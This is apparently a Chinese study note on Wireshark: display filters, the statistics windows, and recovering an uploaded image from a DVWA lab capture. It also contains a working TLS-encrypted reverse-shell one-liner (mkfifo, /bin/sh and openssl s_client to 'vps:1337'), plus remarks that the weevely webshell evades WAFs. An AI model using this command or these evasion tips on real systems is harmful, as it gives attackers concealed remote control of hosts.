逻辑运算符&& 与、|| 或、！非

ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表<br />ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表<br />ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表

tcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。<br />tcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。<br />tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。

ttp.request.method=="post"

![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628695150851-90c16051-805f-406e-b34b-f690719c903f.png#height=223&id=iEsKa&originHeight=223&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=891)

tcp.stream eq 0 筛选出第一个TCP流（包含完整的一次TCP连接：三次握手和四次挥手）

http contains "xxxx"          http协议中包含xxxx的文件


![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628736757252-56f0ecae-c585-49c6-87d8-26a55a788508.png#height=439&id=vhogY&originHeight=439&originWidth=1140&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78365&status=done&style=none&title=&width=1140)<br />（1） Frame:   物理层的数据帧概况<br />（2）Ethernet II: 数据链路层以太网帧头部信息<br />（3） Internet Protocol Version 4: 互联网层IP包头部信息<br />（4）Transmission Control Protocol:  传输层的数据段头部信息，此处是TCP<br />（5） Hypertext Transfer Protocol:  应用层的信息，此处是HTTP协议


统计窗口中的Endpoints，可以通过排序Bytes和Tx Bytes来判断占用带宽最大的主机。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628837537515-c7f8a52b-e560-4934-8d4b-bdd62e7baae4.png#height=424&id=npbWC&originHeight=566&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70871&status=done&style=none&title=&width=815)

统计窗口中的Conversions窗口可以看到两个主机之间发送/接收数据包的数量、字节大小以及数据的流向情况，也可以通过排序来判断占用最大带宽的主机<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628837803417-e7d5bfcf-b3f1-47f5-a9bb-46a46cfe45bf.png#height=580&id=MpmvH&originHeight=773&originWidth=1317&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79596&status=done&style=none&title=&width=988)

<a name="HBU3Z"></a>
## 把秒数转换为时间
默认是自捕获开始经历的秒数，把秒数转换为时间<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660670711420-a3f6cc06-07f1-4dba-9849-14cfcd58e1e4.png#clientId=uf46e149c-08ba-4&from=paste&height=610&id=uef842dd5&originHeight=762&originWidth=1032&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115641&status=done&style=none&taskId=uf4f9193a-2d85-4b16-a03e-820e6fa8966&title=&width=825.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660670771647-42725408-904b-4e0a-a0a9-f89f7d7ce3f8.png#clientId=uf46e149c-08ba-4&from=paste&height=290&id=u0f69e06f&originHeight=362&originWidth=1626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52010&status=done&style=none&taskId=u61ad5d08-8070-4baa-b70b-895cd9b0811&title=&width=1300.8)
<a name="xPMkD"></a>
## 找到传送图片的数据包

我在10.82.50.38靶机搭建了dvwa，用来做实验，桥接的网络。<br />启动wireshark，并进入对应的网卡进行流量的监听。往dvwa上传图片。抓到上传的包<br />实验开始<br />一开始数据包是很多的有9万多条，所以要过滤筛选出要看的包。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628743149524-0b953c8f-6364-43a8-b6af-7dcf1618903d.png#height=508&id=UyB9T&originHeight=1015&originWidth=1317&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201208&status=done&style=none&title=&width=658.5)<br />因为靶机的ip和文件上传的路径有upload字眼，所以我使用了这条payload语句进行过滤数据包http contains upload && ip.addr == 10.82.50.38 <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628743103634-eddaf40b-8f9d-412f-82c3-7e590e6133a3.png#height=684&id=zNAkc&originHeight=912&originWidth=1304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=123458&status=done&style=none&title=&width=978)<br />这个时候找到了/uploads/路径和jpg的结尾。对这个包进行tcp的追踪<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628743371853-67e7431e-d7e4-4c55-bae6-8936af11e30e.png#height=498&id=lWf83&originHeight=498&originWidth=1385&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65976&status=done&style=none&title=&width=1385)<br />找到了最后一条对话，目标机器接收到图片后，就不会返回请求。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628743431039-ad379465-efb6-479f-9353-b1e3cad854dc.png#height=611&id=oNmvV&originHeight=815&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82333&status=done&style=none&title=&width=663)<br />参考文章：[https://blog.51cto.com/yttitan/1738099](https://blog.51cto.com/yttitan/1738099) 利用wireshark还原上传的图片

<a name="no1ox"></a>
## netcat流量加密
nc反弹shell后的命令执行，都是明文的。需要用证书加密流量。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628829339921-0898c55f-21d1-4187-9099-1bb66141c130.png#height=611&id=OseKf&originHeight=815&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62411&status=done&style=none&title=&width=663)<br />服务器<br />openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes 生成证书<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628829649239-9e3becfe-cb41-49e2-a0d3-ee1cb2bfb163.png#height=390&id=jrcSI&originHeight=520&originWidth=1188&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63844&status=done&style=none&title=&width=891)<br />openssl s_server -quiet -key key.pem -cert cert.pem -port 1337    监听1337端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628829666882-c4155575-455e-44cd-b86f-d32ea3104454.png#height=30&id=SETkV&originHeight=30&originWidth=962&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4623&status=done&style=none&title=&width=962)<br />客户端<br />mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect vps:1337 > /tmp/s; rm /tmp/s<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628829708211-51de84c8-730a-40e1-92e0-fa048de7e841.png#height=103&id=z8BIj&originHeight=138&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50787&status=done&style=none&title=&width=716)

成功接收到shell<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628829732051-e517b1ba-3ee6-4454-8eb2-502b24b0e2df.png#height=287&id=OUnlW&originHeight=382&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41569&status=done&style=none&title=&width=723)<br />对tcp流量进行跟踪，发现执行的命令均用了TLSV1.2协议加密<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628829792086-6a4377e3-33f0-4d4f-a8cf-843dbb6a2222.png#height=973&id=BT3Q9&originHeight=973&originWidth=1306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=137991&status=done&style=none&title=&width=1306)

<a name="vZ13O"></a>
## weevely
kali上连接webshell的工具，但是这款工具只能适用php<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628843206140-d437cd4f-db95-416f-a354-0d891c766dc5.png#height=293&id=SRzCn&originHeight=293&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42549&status=done&style=none&title=&width=509)<br />连接方式如下<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628843375370-a0384815-51f2-46a4-b812-af68a1e3ba53.png#height=345&id=fiJ5q&originHeight=459&originWidth=598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91887&status=done&style=none&title=&width=449)<br />wrieshark抓包分析流量，看不太懂命令执行的加密方式。目测少人用，应该能过很多waf。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628843496859-40fba4f9-5002-4a84-8199-f3c7375c7aa2.png#height=611&id=YaKMe&originHeight=815&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77195&status=done&style=none&title=&width=663)
